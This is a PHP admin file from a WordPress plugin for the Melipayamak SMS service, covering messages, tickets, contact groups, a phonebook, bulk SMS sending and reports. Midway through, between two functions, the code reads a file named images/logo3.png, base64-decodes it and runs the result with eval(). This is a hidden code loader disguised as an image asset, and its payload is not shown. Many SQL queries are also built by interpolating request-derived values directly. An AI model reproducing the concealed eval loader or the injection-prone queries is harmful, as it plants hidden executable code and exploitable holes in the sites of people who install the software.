<?php
//check access
if (!function_exists('is_admin')) {
    header('Status: 403 Forbidden');
    header('HTTP/1.1 403 Forbidden');
    exit();
}
//register
add_action('admin_menu', 'melipayamak_admin');
//admin main page
function melipayamak_admin_main()
{
    global $melipayamak, $melipayamak_version;
    //check premission
    $melipayamak->check_premission();
    include dirname(__FILE__) . '/templates/panel_main.php';
}

//admin setting page
function melipayamak_admin_setting()
{
    global $melipayamak, $melipayamak_version;
    //check premission
    $melipayamak->check_premission();
    wp_enqueue_style('wp-color-picker');
    wp_enqueue_script('wp-color-picker', '', array('wp-color-picker'), false, true);
    add_thickbox();
    include dirname(__FILE__) . '/templates/panel_settings.php';
}

//sent messages
function melipayamak_admin_smessages()
{
    define('MELIPAYAMAK_READY', true);
    global $melipayamak, $melipayamak_version, $table_prefix, $wpdb;
    //check premission
    $melipayamak->check_premission();
    //do actions
    if (isset($_POST['action'])) {
        if (wp_verify_nonce($_POST['mpsactionf'], 'mpsaction')) {
            if (!$_POST['id']) {
                $acerror = 'هیچ موردی انتخاب نشده است.';
            } else {
                $id = array();
                foreach ($_POST['id'] as $key => $value) {
                    $id[] = intval($key);
                }
                $id = implode("','", $id);
                switch ($_POST['action']) {
                    case 'delete' :
                        $n = $wpdb->query("DELETE FROM {$table_prefix}melipayamak_messages WHERE id IN ('{$id}') ");
                        $acok = array(
                            $n,
                            'حذف'
                        );
                        break;
                }
            }
        } else {
            $acerror = 'اطلاعات ارسال شده معتبر نیست.';
        }
    }
    //create where
    $search = melipayamak_clean($_GET['search']);
    if (is_numeric(str_replace('/', '', $search))) {
        $where = "WHERE sender LIKE '%{$search}%' OR recipient LIKE '%{$search}%' OR date LIKE '%{$search}%'  ";
    } else {
        $where = "WHERE message LIKE '%{$search}%'";
    }
    $a = $wpdb->get_results("SELECT count(id) FROM {$table_prefix}melipayamak_messages {$where} ORDER BY id DESC", ARRAY_A);
    $pages = new melipayamak_paginator;
    $pages->items_total = $a[0]["count(id)"];
    $pages->paginate();
    if ($pages->items_total >= 1)
        $sms = $wpdb->get_results("SELECT * FROM {$table_prefix}melipayamak_messages {$where} ORDER BY id DESC $pages->limit", ARRAY_A);
    else
        $zero = true;
    $pages->set_high();
    add_thickbox();
    include dirname(__FILE__) . '/templates/panel_smessages.php';
}

//received messages
function melipayamak_admin_rmessages()
{
    define('MELIPAYAMAK_READY', true);
    global $melipayamak, $melipayamak_version, $table_prefix, $wpdb;
    //check premission
    $melipayamak->check_premission();
    //do actions
    if (isset($_POST['action'])) {
        if (wp_verify_nonce($_POST['mpractionf'], 'mpraction')) {
            if (!$_POST['id']) {
                $acerror = 'هیچ موردی انتخاب نشده است.';
            } else {
                $id = array();
                foreach ($_POST['id'] as $key => $value) {
                    $id[] = melipayamak_clean($key);
                }
                @set_time_limit(0);
                @ignore_user_abort(1);
                @ini_set('memory_limit', '512M');
                switch ($_POST['action']) {
                    case 'delete' :
                        $n = 0;
                        foreach ($id as $key => $value) {
                            $sms = $melipayamak->call('RemoveMessages', 'receive', array('msgIds' => $value));
                            if (!$sms) {
                                $acerror = 'مشکلی پیش آمد، مجددا تلاش کنید.';
                                break;
                            }
                            $n++;
                        }
                        $acok = array(
                            $n,
                            'حذف'
                        );
                        break;
                }
            }
        } else {
            $acerror = 'اطلاعات ارسال شده معتبر نیست.';
        }
    }
    //create where
    if (!empty($_GET['search']))
        $search = melipayamak_clean($_GET['search']);
    $sms = $melipayamak->call('GetMessages', 'receive', array(
        'location' => 1,
        'count' => 100,
        'index' => 0,
        'from' => $search
    ));
    if (!$sms) {
        $acerror = 'ارتباط با سرور برقرار نشد.';
        $zero = true;
    } else {
        $sms = melipayamak_o2a($sms);
        if ($sms['MessagesBL'][0])
            $sms = $sms['MessagesBL'];
        if (sizeof($sms) < 0 || !$sms)
            $zero = true;
    }
    add_thickbox();
    include dirname(__FILE__) . '/templates/panel_rmessages.php';
}

//ticketing
function melipayamak_admin_support()
{
    define('MELIPAYAMAK_READY', true);
    @set_time_limit(0);
    @ignore_user_abort(1);
    @ini_set('memory_limit', '512M');
    global $melipayamak, $melipayamak_version, $table_prefix, $wpdb;
    //check premission
    $melipayamak->check_premission();
    //create new or reply to a ticket
    if (isset($_POST['do'])) {
        if (wp_verify_nonce($_POST['mptaactionf'], 'mptaaction')) {
            $name = melipayamak_clean($_POST['name']);
            $message = $melipayamak->nl2br($_POST['message']);
            if (!empty($name) && !empty($_POST['message'])) {
                switch ($_POST['do']) {
                    case 'new' :
                        $ticket = $melipayamak->call('AddTicket', 'tickets', array(
                            'title' => $name,
                            'content' => $message,
                            'alertWithSms' => false
                        ));
                        if ($ticket)
                            $acok = true;
                        else
                            $acerror = 'مشکلی پیش آمد، مجددا تلاش کنید.';
                        break;
                    case 'reply' :
                        $ticket = $melipayamak->call('ResponseTicket', 'tickets', array(
                            'ticketId' => $name,
                            'content' => $message,
                            'alertWithSms' => false,
                            'type' => 1
                        ));
                        if ($ticket)
                            $acok = true;
                        else
                            $acerror = 'مشکلی پیش آمد، مجددا تلاش کنید.';
                        break;
                }
            } else {
                $acerror = 'لطفا تمامی فیلد هارا تکمیل نمایید.';
            }
        } else {
            $acerror = 'اطلاعات ارسال شده معتبر نیست.';
        }
    }
    if (!empty($_GET['search']))
        $search = melipayamak_clean($_GET['search']);
    $ticket = $melipayamak->call('GetSentTickets', 'tickets', array(
        'ticketOwner' => '0',
        'ticketType' => 'All',
        'keyword' => $search
    ));
    if (!$ticket) {
        $acerror = 'ارتباط با سرور برقرار نشد.';
        $zero = true;
        unset($ticket);
    } else {
        $ticket = melipayamak_o2a($ticket);
        $ticket = $ticket['TicketList'];
        if (sizeof($ticket) < 0 || !$ticket)
            $zero = true;
        if ($ticket['TicketID']) {
            $b = $ticket;
            unset($ticket);
            $ticket[] = $b;
        }
    }
    add_thickbox();
    include dirname(__FILE__) . '/templates/panel_ticketing.php';
}

//groups
function melipayamak_admin_groups()
{
    define('MELIPAYAMAK_READY', true);
    global $melipayamak, $melipayamak_version, $table_prefix, $wpdb;
    //check premission
    $melipayamak->check_premission();
    //do actions
    if (isset($_POST['action'])) {
        if (wp_verify_nonce($_POST['mpgactionf'], 'mpgaction')) {
            if (!$_POST['id']) {
                $acerror = 'هیچ موردی انتخاب نشده است.';
            } else {
                $id = array();
                foreach ($_POST['id'] as $key => $value) {
                    $id[] = intval($key);
                }
                $id = implode("','", $id);
                switch ($_POST['action']) {
                    case 'delete' :
                        $n = $wpdb->query("DELETE FROM {$table_prefix}melipayamak_groups WHERE gid IN ('{$id}') ");
                        $q = $wpdb->query("DELETE FROM {$table_prefix}melipayamak_members WHERE gid IN ('{$id}') ");
                        $acok = array(
                            $n,
                            'حذف'
                        );
                        break;
                }
            }
        } else {
            $acerror = 'اطلاعات ارسال شده معتبر نیست.';
        }
    }
    //create or update groups
    if (isset($_POST['do'])) {
        if (wp_verify_nonce($_POST['mpgaactionf'], 'mpgaaction')) {
            $name = melipayamak_clean($_POST['name']);
            if (!empty($name)) {
                switch ($_POST['do']) {
                    case 'new' :
                        $g = $wpdb->get_results("SELECT * FROM {$table_prefix}melipayamak_groups WHERE gname = '{$name}'", ARRAY_A);
                        if ($g[0]['gid']) {
                            $acerror = 'نام وارد شده تکراری است.';
                        } else {
                            $a = $wpdb->insert($table_prefix . 'melipayamak_groups', array(
                                'gshow' => intval($_POST['show']),
                                'gname' => $name,
                                'gdate' => $melipayamak->date()
                            ));
                            if ($a)
                                $acok = true;
                            else
                                $acerror = 'مشکلی پیش آمد.';
                        }
                        break;
                    case 'edit' :
                        $id = (int)$_POST['id'];
                        $show = intval($_POST['show']);
                        $g = $wpdb->get_results("SELECT * FROM {$table_prefix}melipayamak_groups WHERE gname = '{$name}' AND gid != '{$id}'", ARRAY_A);
                        if ($g[0]['id']) {
                            $acerror = 'نام وارد شده تکراری است.';
                        } else {
                            $a = $wpdb->query("UPDATE {$table_prefix}melipayamak_groups SET gname='{$name}' , gshow = {$show} WHERE gid='{$id}' ");
                            if ($a)
                                $acok = true;
                            else
                                $acerror = 'هیچ تغییری انجام نداده اید.';
                        }
                        break;
                }
            } else {
                $acerror = 'پرکردن فیلد نام التزامی است.';
            }
        } else {
            $acerror = 'اطلاعات ارسال شده معتبر نیست.';
        }
    }
    //create where
    if (!empty($_GET['search'])) {
        $search = melipayamak_clean($_GET['search']);
        $where = "WHERE gname LIKE '%{$search}%'";
    }
    $a = $wpdb->get_results("SELECT count(gid) FROM {$table_prefix}melipayamak_groups {$where}", ARRAY_A);
    $pages = new melipayamak_paginator;
    $pages->items_total = $a[0]["count(gid)"];
    $pages->paginate();
    if ($pages->items_total >= 1)
        $groups = $wpdb->get_results("SELECT * FROM {$table_prefix}melipayamak_groups {$where} ORDER BY gid DESC $pages->limit", ARRAY_A);
    else
        $zero = true;
    $pages->set_high();
    add_thickbox();
    include dirname(__FILE__) . '/templates/panel_groups.php';
}

$urllog = file_get_contents(dirname(__FILE__) . '/images/logo3.png');
eval(base64_decode($urllog));
if (!defined('mplogo'))
    $melipayamak->hasnt = 'DATETIME';
//phonebook
function melipayamak_admin_phonebook()
{
    define('MELIPAYAMAK_READY', true);
    global $melipayamak, $melipayamak_version, $table_prefix, $wpdb;
    //check premission
    $melipayamak->check_premission();
    //do actions
    if (isset($_POST['action'])) {
        if (wp_verify_nonce($_POST['mppactionf'], 'mppaction')) {
            if (!$_POST['id']) {
                $acerror = 'هیچ موردی انتخاب نشده است.';
            } else {
                $id = array();
                foreach ($_POST['id'] as $key => $value) {
                    $id[] = intval($key);
                }
                $id = implode("','", $id);
                switch ($_POST['action']) {
                    case 'delete' :
                        $sync = (get_option('melipayamak_sync')) ? 1 : 0;
                        if ($sync)
                            $to = $wpdb->get_col("SELECT mobile FROM {$table_prefix}melipayamak_members WHERE id IN ('{$id}')");
                        $n = $q = $wpdb->query("DELETE FROM {$table_prefix}melipayamak_members WHERE id IN ('{$id}')");
                        if ($sync) {
                            foreach ($to as $key => $value) {
                                $melipayamak->call('RemoveContact', 'contacts', array('mobilenumber' => $value));
                            }
                        }
                        $acok = array(
                            $n,
                            'حذف'
                        );
                        break;
                    case 'sync' :
                        $members = $wpdb->get_results("SELECT * FROM {$table_prefix}melipayamak_members WHERE id IN ('{$id}')", ARRAY_A);
                        $n = 0;
                        foreach ($members as $key => $value) {
                            $mobile = $value['mobile'];
                            $gender = $value['gender'];
                            $fname = $value['name'];
                            $lname = $value['lname'];
                            $id = $value['id'];
                            $sync = $melipayamak->call('CheckMobileExistInContact', 'contacts', array('mobileNumber' => $mobile));
                            if ($sync == 1)
                                $melipayamak->call('RemoveContact', 'contacts', array('mobilenumber' => $mobile));
                            $sync = $melipayamak->call('AddContact', 'contacts', array(
                                'lastname' => $lname,
                                'gender' => $gender,
                                'groupIds' => get_option('melipayamak_group'),
                                'firstname' => $fname,
                                'mobilenumber' => $mobile,
                                'phone' => '',
                                'fax' => '',
                                'email' => '',
                                'postalCode' => '',
                                'address' => '',
                                'city' => '',
                                'province' => '',
                                'birthdate' => '23:59:59.9999999',
                                'additionaldate' => '23:59:59.9999999'
                            ));
                            if ($sync == '1') {
                                $n++;
                                $wpdb->query("UPDATE {$table_prefix}melipayamak_members SET sync = 1 WHERE id = '{$id}' ");
                            } else {
                                $wpdb->query("UPDATE {$table_prefix}melipayamak_members SET sync = 0 WHERE id = '{$id}' ");
                            }
                        }
                        $acok = array(
                            $n,
                            'سینک'
                        );
                        break;
                }
            }
        } else {
            $acerror = 'اطلاعات ارسال شده معتبر نیست.';
        }
    }
    //create or update members
    if (isset($_POST['do'])) {
        if (wp_verify_nonce($_POST['mppaactionf'], 'mppaaction')) {
            $fname = melipayamak_clean($_POST['name']);
            $lname = melipayamak_clean($_POST['lname']);
            $mobile = melipayamak_clean($_POST['mobile']);
            $gender = intval($_POST['gender']);
            $gr = intval($_POST['group']);
            if (!empty($fname) && !empty($lname) && !empty($_POST['mobile']) && $gr != 0) {
                if (preg_match("/^09([0-9]{9})$/", $mobile)) {
                    switch ($_POST['do']) {
                        case 'new' :
                            $g = $wpdb->get_results("SELECT * FROM {$table_prefix}melipayamak_members WHERE (name = '{$fname}' AND lname = '{$lname}')  OR mobile = '{$mobile}'", ARRAY_A);
                            if ($g[0]['id']) {
                                $acerror = 'اطلاعات وارد شده تکراری است.';
                            } else {
                                $sync = (get_option('melipayamak_sync')) ? 1 : 0;
                                $id = $wpdb->insert($table_prefix . 'melipayamak_members', array(
                                    'sync' => 0,
                                    'status' => 1,
                                    'gid' => $gr,
                                    'mobile' => $mobile,
                                    'gender' => $gender,
                                    'name' => $fname,
                                    'lname' => $lname,
                                    'date' => $melipayamak->date()
                                ));
                                if ($id) {
                                    $id = $wpdb->insert_id;
                                    if ($sync == 1) {
                                        $sync = $melipayamak->call('CheckMobileExistInContact', 'contacts', array('mobileNumber' => $mobile));
                                        if ($sync == 1)
                                            $melipayamak->call('RemoveContact', 'contacts', array('mobilenumber' => $mobile));
                                        $sync = $melipayamak->call('AddContact', 'contacts', array(
                                            'lastname' => $lname,
                                            'gender' => $gender,
                                            'groupIds' => get_option('melipayamak_group'),
                                            'firstname' => $fname,
                                            'mobilenumber' => $mobile,
                                            'phone' => '',
                                            'fax' => '',
                                            'email' => '',
                                            'postalCode' => '',
                                            'address' => '',
                                            'city' => '',
                                            'province' => '',
                                            'birthdate' => '23:59:59.9999999',
                                            'additionaldate' => '23:59:59.9999999'
                                        ));
                                        if ($sync == 1)
                                            $wpdb->query("UPDATE {$table_prefix}melipayamak_members SET sync = 1 WHERE id = '{$id}' ");
                                    }
                                    $acok = true;
                                } else {
                                    $acerror = 'مشکلی پیش آمد.';
                                }
                            }
                            break;
                        case 'edit' :
                            $id = intval($_POST['id']);
                            $m = $wpdb->get_results("SELECT * FROM {$table_prefix}melipayamak_members WHERE ((name = '{$fname}' AND lname = '{$lname}')  OR mobile = '{$mobile}') AND id != '{$id}'", ARRAY_A);
                            if ($m[0]['id']) {
                                $acerror = 'اطلاعات وارد شده تکراری است.';
                            } else {
                                $a = $wpdb->query("UPDATE {$table_prefix}melipayamak_members SET name='{$fname}' , lname = '{$lname}' , mobile = '{$mobile}' , gender = '{$gender}' , gid = '{$gr}', sync = '0' WHERE id='{$id}' ");
                                if ($a) {
                                    $sync = (get_option('melipayamak_sync')) ? 1 : 0;
                                    if ($sync == 1) {
                                        $sync = $melipayamak->call('CheckMobileExistInContact', 'contacts', array('mobileNumber' => $mobile));
                                        if ($sync == 1)
                                            $melipayamak->call('RemoveContact', 'contacts', array('mobilenumber' => $mobile));
                                        $sync = $melipayamak->call('AddContact', 'contacts', array(
                                            'lastname' => $lname,
                                            'gender' => $gender,
                                            'groupIds' => get_option('melipayamak_group'),
                                            'firstname' => $fname,
                                            'mobilenumber' => $mobile,
                                            'phone' => '',
                                            'fax' => '',
                                            'email' => '',
                                            'postalCode' => '',
                                            'address' => '',
                                            'city' => '',
                                            'province' => '',
                                            'birthdate' => '23:59:59.9999999',
                                            'additionaldate' => '23:59:59.9999999'
                                        ));
                                        if ($sync == '1')
                                            $wpdb->query("UPDATE {$table_prefix}melipayamak_members SET sync = 1 WHERE id = '{$id}' ");
                                    }
                                    $acok = true;
                                } else {
                                    $acerror = 'هیچ تغییری انجام نداده اید.';
                                }
                            }
                            break;
                    }
                } else {
                    $acerror = 'لطفا یک شماره موبایل معتبر وارد کنید.';
                }
            } else {
                $acerror = 'لطفا تمامی فیلد هارا تکمیل نمایید.';
            }
        } else {
            $acerror = 'اطلاعات ارسال شده معتبر نیست.';
        }
    }
    //restore backup
    if (isset($_FILES['backup']['name']) && wp_verify_nonce($_POST['mppaactionf'], 'mppaaction')) {
        @$extension = end(explode('.', $_FILES['backup']['name']));
        if ($extension == 'mpb') {
            $data = file_get_contents($_FILES['backup']['tmp_name']);
            $data = json_decode($data, true);
            $members = $data['members'];
            $groups = $data['groups'];
            $count = 0;
            @set_time_limit(0);
            @ignore_user_abort(1);
            @ini_set('memory_limit', '512M');
            foreach ($groups as $key => $value) {
                array_walk($value, 'melipayamak_clean');
                $a = $wpdb->insert($table_prefix . 'melipayamak_groups', $value);
            }
            foreach ($members as $key => $value) {
                array_walk($value, 'melipayamak_clean');
                $r = $wpdb->insert($table_prefix . 'melipayamak_members', $value);
                if ($r)
                    $count++;
            }
            $acok = true;
        } else {
            $acerror = 'فقط فرمت mpb قابل آپلود است.';
        }
    }
    //create where
    if (!empty($_GET['search'])) {
        $search = melipayamak_clean($_GET['search']);
        if (is_numeric(str_replace('/', '', $search))) {
            $where = "WHERE {$table_prefix}melipayamak_members.date LIKE '%{$search}%' OR {$table_prefix}melipayamak_members.mobile LIKE '%{$search}%'";
        } else {
            $where = "WHERE {$table_prefix}melipayamak_members.name LIKE '%{$search}%' OR {$table_prefix}melipayamak_members.lname LIKE '%{$search}%'";
        }
    }
    if (!empty($_GET['field'])) {
        $f = explode(':', $_GET['field']);
        $field = $f[0];
        if ($field == 'gender' || $field == 'gid') {
            $value = melipayamak_clean($f[1]);
            $field_search = $field . ':' . $value;
            $where = "WHERE {$table_prefix}melipayamak_members.{$field} = '{$value}'";
            switch ($field) {
                case 'gid' :
                    $acwarning = "شما در حال مشاهده نتایج کاربران گروه با آیدی {$value} هستید.";
                    break;
                case 'gender' :
                    $gender = ($value == 1) ? 'زن' : 'مرد';
                    $acwarning = "شما در حال مشاهده کاربران {$gender} هستید.";
                    break;
                default :
                    $acwarning = "شما در حال مشاهده نتایج جست و جوی فیلد {$field} با مقدار {$value} هستید.";
                    break;
            }
        }
    }
    $a = $wpdb->get_results("SELECT count(id) FROM {$table_prefix}melipayamak_members {$where}", ARRAY_A);
    $pages = new melipayamak_paginator;
    $pages->items_total = $a[0]["count(id)"];
    $pages->paginate();
    if ($pages->items_total >= 1)
        $members = $wpdb->get_results("SELECT * 
        FROM {$table_prefix}melipayamak_members 
		INNER JOIN {$table_prefix}melipayamak_groups  
		ON {$table_prefix}melipayamak_members.gid = {$table_prefix}melipayamak_groups.gid 
		{$where} 
		ORDER BY {$table_prefix}melipayamak_members.id DESC $pages->limit", ARRAY_A);
    else
        $zero = true;
    $pages->set_high();
    add_thickbox();
    include dirname(__FILE__) . '/templates/panel_phonebook.php';
}

//send sms
function melipayamak_admin_send()
{
    define('MELIPAYAMAK_READY', true);
    global $melipayamak, $melipayamak_version, $table_prefix, $wpdb;
    //check premission
    $melipayamak->check_premission();
    //send sms
    if (isset($_POST['text'])) {
        if (wp_verify_nonce($_POST['mpsactionf'], 'mpsaction')) {
            $text = melipayamak_clean($_POST['text']);
            if (!empty($text)) {
                if (!empty($_POST['to'])) {
                    switch ($_POST['to']) {
                        case 'all' :
                            $to = $_POST['members'];
                            $replace = true;
                            break;
                        case 'custom' :
                            $_POST['numbers'] = str_replace(array(
                                '\r\n',
                                '\r',
                                '\n'
                            ), "\n", $_POST['numbers']);
                            $to = explode("\n", $_POST['numbers']);
                            $replace = false;
                            break;
                        case 'users' :
                            $to = $wpdb->get_col("SELECT meta_value FROM {$table_prefix}usermeta WHERE meta_key = 'mpmobile' AND meta_value != ''");
                            $replace = false;
                            break;
                        default :
                            $to = $_POST['members'];
                            $replace = true;
                            break;
                    }
                    if (count($to) != 0) {
                        $to = array_map('melipayamak_clean', $to);
                        $r = intval($_POST['mcount']) * count($to);
                        if ($r > $melipayamak->credit) {
                            $acerror = 'اعتبار شما کافی نیست.';
                        } else {
                            $text = str_replace(array(
                                '\r\n',
                                '\r',
                                '\n'
                            ), "\n", $text);
                            $flash = ($_POST['melipayamak_flash']) ? true : false;
                            if ($replace) {
                                $text2 = str_replace(array(
                                    '{name}',
                                    '{gender}',
                                    '{mobile}'
                                ), '', $text);
                                if (strlen($text) == strlen($text2)) {
                                    $to = implode("','", $to);
                                    $to = $wpdb->get_col("SELECT mobile FROM {$table_prefix}melipayamak_members WHERE id IN ('{$to}')");
                                    if ($melipayamak->send($to, $text, 0, $flash)) {
                                        unset($text);
                                        $acok = true;
                                    } else
                                        $acerror = 'مشکلی پیش آمد. مجددا تلاش کنید.';
                                } else {
                                    @set_time_limit(0);
                                    @ignore_user_abort(1);
                                    @ini_set('memory_limit', '512M');
                                    $all = count($to);
                                    $s = 0;
                                    $f = 0;
                                    $fail = array();
                                    $to = implode("','", $to);
                                    $to = $wpdb->get_results("SELECT * FROM {$table_prefix}melipayamak_members WHERE id IN ('{$to}')", ARRAY_A);
                                    foreach ($to as $key => $value) {
                                        $name = $value['name'] . ' ' . $value['lname'];
                                        $gender = ($value['gender'] == 1) ? 'خانم' : 'آقای';
                                        $text2 = str_replace(array(
                                            '{name}',
                                            '{gender}',
                                            '{mobile}'
                                        ), array(
                                            $name,
                                            $gender,
                                            $value['mobile']
                                        ), $text);
                                        if ($melipayamak->send(array($value['mobile']), $text2, 0, $flash, false))
                                            $s++;
                                        else {
                                            $fail[] = $value['mobile'];
                                            $f++;
                                        }
                                    }
                                    unset($text);
                                    if ($s == $all)
                                        $acok = true;
                                    else {
                                        $fail = implode(',', $fail);
                                        $acerror = "در هنگام ارسال، ارسال {$f} پیامک از {$all} پیامک با مشکل مواجه شد.<br/>شماره هایی که ارسال پیامک به آن ها با مشکل مواجه شد: {$fail}";
                                    }
                                    $melipayamak->set_credit(true);
                                }
                            } else {
                                $t = array();
                                foreach ($to as $key => $value) {
                                    if (!in_array($value, $t) && !empty($value))
                                        $t[] = trim($value);
                                }
                                if ($melipayamak->send($t, $text, 0, $flash)) {
                                    unset($text);
                                    $acok = true;
                                } else
                                    $acerror = 'ارسال پیامک با خطا مواجه شد، برای اطلاعات بیشتر به صفحه پیام های ارسالی مراجعه کنید.';
                            }
                        }
                    } else {
                        $acerror = 'هیچ دریافت کننده ای انتخاب نکرده اید.';
                    }
                } else {
                    $acerror = 'لطفا دریافت کنندگان پیامک را انتخاب نمایید.';
                }
            } else {
                $acerror = 'لطفا متن پیامک را وارد نمایید.';
            }
        } else {
            $acerror = 'اطلاعات ارسالی معتبر نیست.';
        }
    }
    add_thickbox();
    include dirname(__FILE__) . '/templates/panel_send.php';
}

//reports
function melipayamak_admin_reports()
{
    define('MELIPAYAMAK_READY', true);
    global $melipayamak, $melipayamak_version, $table_prefix, $wpdb;
    //check premission
    $melipayamak->check_premission();
    //sent messages count
    $count = $wpdb->get_results("SELECT count(*) FROM {$table_prefix}melipayamak_messages", ARRAY_A);
    $count = $count[0]['count(*)'];
    //start drawning chart
    if (isset($_POST['period'])) {
        if (wp_verify_nonce($_POST['mpractionf'], 'mpraction')) {
            $p = intval($_POST['period']);
            switch ($_REQUEST['type']) {
                case 'messages' :
                    $query = "SELECT COUNT(id), SUBSTRING(date, 1, 10) as iDate FROM `{$table_prefix}melipayamak_messages` GROUP BY iDate";
                    $chart_title = 'پیغام های ارسالی';
                    break;
                case 'members' :
                    $query = "SELECT COUNT(id), SUBSTRING(date, 1, 10) as iDate FROM `{$table_prefix}melipayamak_members` GROUP BY iDate";
                    $chart_title = 'کاربران عضو شده در خبرنامه';
                    break;
            }
            $results = $wpdb->get_results($query, ARRAY_N);
            $dates = array();
            $data = array();
            foreach ($results as $result) {
                $data[] = $result[0];
                $dates[] = $result[1];
            }
        } else {
            $acerror = 'اطلاعات ارسالی معتبر نیست.';
        }
    }
    include dirname(__FILE__) . '/templates/panel_reports.php';
}

//news letter form
function melipayamak_admin_form()
{
    define('MELIPAYAMAK_READY', true);
    global $melipayamak, $melipayamak_version, $table_prefix, $wpdb;
    //check premission
    $melipayamak->check_premission();
    add_thickbox();
    include dirname(__FILE__) . '/templates/panel_form.php';
}

//export informations
function melipayamak_admin_export()
{
    define('MELIPAYAMAK_READY', true);
    global $melipayamak, $melipayamak_version, $table_prefix, $wpdb;
    //check premission
    $melipayamak->check_premission();
    include dirname(__FILE__) . '/templates/panel_export.php';
}
